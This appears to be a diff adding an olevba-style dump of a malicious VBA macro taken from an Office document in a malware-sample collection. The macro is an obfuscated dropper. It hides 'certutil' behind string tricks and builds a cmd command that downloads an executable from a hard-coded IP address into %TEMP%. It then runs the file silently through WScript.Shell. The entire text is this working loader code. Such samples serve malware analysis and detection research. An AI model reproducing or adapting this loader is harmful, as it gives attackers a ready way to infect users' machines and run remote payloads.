@@ -1,0 +1,72 @@
+Filename     : ./macros/83db882764f3a3789568ca914adf48a2c5566ef18360f9b8ec131194f3fd78c1
+OLE stream   : _VBA_PROJECT_CUR/VBA/MOwgzpY
+VBA filename : MOwgzpY.bas
+----------------------------------------
+Attribute VB_Name = "MOwgzpY"
+
+
+Public Sub slBepkZpb()
+
+On Error Resume Next
+
+
+
+
+
+
+
+
+
+
+
+
+zzz = Left$("cenYiuR5W9lkJ1QFNdp1LOXr3xpUnASRRgA44xMoMDOiPLjv1mbgD8qYSOYp2xGk7JtbiL28sFyhxiKYc", Log(10) - Log(2))
+
+
+
+
+DRQtWBFRKGjVMOVLySOUHPPZntLzxBo = "cmd /c" & _
+" " & _
+zzz & "rtutil" & _
+" " & _
+"-urlcache" & _
+" " & _
+"-split" & _
+" " & _
+"-f" & _
+" " & _
+"http://45.67.14.154/B/DEPOSITE" & _
+" " & _
+"%TEMP%\fUqzYzwPHQDGDUF.exe" & _
+"&" & _
+" " & _
+"%TEMP%\fUqzYzwPHQDGDUF.exe"
+
+Dim klo As Integer
+
+
+klo = 56
+
+    If klo = 5647 Then
+
+            Dim b As Boolean
+
+       
+    Else
+       teregdacetm (DRQtWBFRKGjVMOVLySOUHPPZntLzxBo + EMHspecmWbZUxTUMoECVSDgnBqFdpGTI)
+    End If
+
+
+
+
+
+End Sub
+
+
+Sub teregdacetm(alfdWOQWn As String)
+    With CreateObject("WScript.Shell")
+        .Run alfdWOQWn, Left(Left(Mid("ingfbbamkodhqcwtpzhbcpxqaaigdjmoadch626463965207171466558669015372347853185123047524556333900563576839593172803245215818260", 47), 1), 1), True
+    End With
+End Sub
+
+
